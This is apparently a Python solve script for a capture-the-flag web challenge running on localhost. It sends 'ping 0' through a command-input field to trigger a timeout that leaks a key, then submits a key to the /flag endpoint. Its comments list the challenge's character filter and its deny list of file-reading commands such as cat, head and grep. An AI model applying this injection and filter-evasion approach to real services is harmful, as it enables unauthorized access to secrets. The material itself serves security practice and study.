import requests
import hashlib
import string

host = "http://127.0.0.1"
port = 8000

# phase1: timeout 유발
input_data = {
    "key": hashlib.md5(b"a").hexdigest(),
    "cmd_input": "ping 0"
    # cmd_input으로서 허용되는 문자: a-z, 0-9, whitespace(" ")
    # cmd_input으로서 불허용되는 단어 :
    # 'flag','cat','chmod','head','tail','less','awk','more','grep'
}

req = requests.post(host + ":" + str(port) + "/flag", data = input_data)
print(req.text)
# Timeout! Your key: 409ac0d96943d3da52f176ae9ff2b974

# phase2: key 입력
input_data = {
    "key": "d5bcfd0dc4120ffab2f32370346b2164",
    "cmd_input": ""
    # cmd_input으로서 허용되는 문자: a-z, 0-9, whitespace(" ")
    # cmd_input으로서 불허용되는 단어 :
    # 'flag','cat','chmod','head','tail','less','awk','more','grep'
}

req = requests.post(host + ":" + str(port) + "/flag", data = input_data)
print(req.text)

